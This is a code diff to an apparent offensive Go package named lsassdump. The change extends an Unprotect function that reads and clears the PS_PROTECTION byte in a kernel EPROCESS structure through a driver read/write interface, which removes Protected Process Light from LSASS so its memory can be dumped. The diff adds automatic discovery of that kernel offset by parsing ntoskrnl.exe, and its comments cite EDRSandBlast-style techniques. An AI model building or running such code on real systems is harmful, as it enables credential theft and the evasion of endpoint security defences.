@@ -59,9 +59,17 @@ var ErrInvalidProtectionOffset = errors.New("lsassdump: zero ProtectionOffset â€
 // strategies (PsLookupProcessByProcessId proxy, kernel handle table,
 // EDRSandBlast-style PspCidTable parse).
 //
+// When tab.ProtectionOffset is zero, Unprotect attempts to discover
+// it dynamically via DiscoverProtectionOffset(""), which parses
+// %SystemRoot%\System32\ntoskrnl.exe. Operators on locked-down
+// hosts (no read access to ntoskrnl, custom kernel image path)
+// continue to populate tab.ProtectionOffset explicitly â€” the
+// auto-discovery path is a convenience for the common case.
+//
 // Returns ErrInvalidEProcess if eprocess == 0,
-// ErrInvalidProtectionOffset if tab.ProtectionOffset == 0, or the
-// underlying writer error wrapped with the failing kernel VA.
+// ErrInvalidProtectionOffset if both tab.ProtectionOffset == 0 AND
+// auto-discovery fails, or the underlying writer error wrapped
+// with the failing kernel VA.
 func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLToken, error) {
 	if rw == nil {
 		return PPLToken{}, driver.ErrNotLoaded
@@ -69,10 +77,16 @@ func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLT
 	if eprocess == 0 {
 		return PPLToken{}, ErrInvalidEProcess
 	}
-	if tab.ProtectionOffset == 0 {
-		return PPLToken{}, ErrInvalidProtectionOffset
+	offset := tab.ProtectionOffset
+	if offset == 0 {
+		discovered, err := DiscoverProtectionOffset("")
+		if err != nil {
+			return PPLToken{}, fmt.Errorf("%w: auto-discovery failed: %v",
+				ErrInvalidProtectionOffset, err)
+		}
+		offset = discovered
 	}
-	target := eprocess + uintptr(tab.ProtectionOffset)
+	target := eprocess + uintptr(offset)
 	buf := make([]byte, 1)
 	if _, err := rw.ReadKernel(target, buf); err != nil {
 		return PPLToken{}, fmt.Errorf("read PS_PROTECTION @0x%X: %w", target, err)
@@ -84,7 +98,7 @@ func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLT
 	return PPLToken{
 		EProcess:           eprocess,
 		OriginalProtection: original,
-		ProtectionOffset:   tab.ProtectionOffset,
+		ProtectionOffset:   offset,
 	}, nil
 }
 
